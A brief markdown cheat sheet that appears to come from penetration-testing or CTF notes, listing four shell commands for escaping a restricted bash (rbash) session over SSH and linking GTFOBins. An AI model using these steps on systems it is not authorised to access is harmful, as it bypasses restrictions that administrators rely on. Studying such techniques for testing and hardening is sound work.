# Breaking out of restricted Bash (rbash) CLI in SSH

## requirements: can run export

### 1) Run SHELL

    export SHELL=/bin/bash

### 2) Create PATH

    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

### 3) Connect with no profile

    ssh USER@IP 'bash --noprofile'

### 4) Check available commands

    compgen -c 


GTFOBins: https://gtfobins.github.io/

